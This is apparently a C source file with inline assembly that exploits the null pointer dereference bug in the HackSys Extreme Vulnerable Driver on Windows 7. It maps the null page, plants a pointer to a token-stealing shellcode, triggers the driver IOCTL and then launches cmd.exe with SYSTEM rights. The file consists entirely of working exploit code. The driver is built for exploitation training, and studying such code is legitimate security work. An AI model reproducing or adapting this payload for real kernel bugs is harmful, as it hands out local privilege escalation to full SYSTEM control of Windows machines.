#include "Base.h"

#define KTHREAD_OFFSET     0x124  // nt!_KPCR.PcrbData.CurrentThread
#define EPROCESS_OFFSET    0x050  // nt!_KTHREAD.ApcState.Process
#define PID_OFFSET         0x0B4  // nt!_EPROCESS.UniqueProcessId
#define FLINK_OFFSET       0x0B8  // nt!_EPROCESS.ActiveProcessLinks.Flink
#define TOKEN_OFFSET       0x0F8  // nt!_EPROCESS.Token
#define SYSTEM_PID         0x004  // SYSTEM Process PID

VOID TokenStealingPayloadWin7() {
	// Importance of Kernel Recovery
	__asm {
		pushad; Save registers state

		; Start of Token Stealing Stub
		xor eax, eax; Set ZERO
		mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
		; _KTHREAD is located at FS : [0x124]

		mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process

		mov ecx, eax; Copy current process _EPROCESS structure

		mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM process PID = 0x4

		SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
			mov[ecx + TOKEN_OFFSET], edx; Replace target process nt!_EPROCESS.Token
			; with SYSTEM process nt!_EPROCESS.Token
			; End of Token Stealing Stub

			popad;
			pop edi;
			pop esi;
			pop ebx;
			retn;
	}
}

int main()
{
	std::tr1::shared_ptr<BaseIoctl> bc(new BaseIoctl());
	bc->OpenDevice();

	PVOID BaseAddress = (PVOID)0x1;
	SIZE_T size = 2048;
	FARPROC _NtAllocateVirtualMemory =
		GetProcAddress(GetModuleHandleA("ntdll.dll"),
			"NtAllocateVirtualMemory");

	typedef NTSTATUS(WINAPI *PNtAllocateVirtualMemory)(
		HANDLE Processhandle,
		PVOID *BaseAddress,
		ULONG_PTR ZeroBits,
		PSIZE_T RegionSize,
		ULONG AllocationType,
		ULONG Protect);

	PNtAllocateVirtualMemory NtAllocateVirtualMemory =
		(PNtAllocateVirtualMemory)_NtAllocateVirtualMemory;

	NtAllocateVirtualMemory(GetCurrentProcess(),
		&BaseAddress, 0x0, &size, 
		MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
		PAGE_EXECUTE_READWRITE);

	BYTE *Magic = (BYTE *)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0x1000);
	memcpy(Magic, "AAAA", 4);

	PVOID NullPointer = (PVOID)0x4;
	*(PULONG)NullPointer = (ULONG)&TokenStealingPayloadWin7;

	bc->sendData((const char *)Magic, 4, HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE);
	bc->CloseDevice();

	WinExec("C:\\Windows\\system32\\cmd.exe", NULL);
	return 0;
}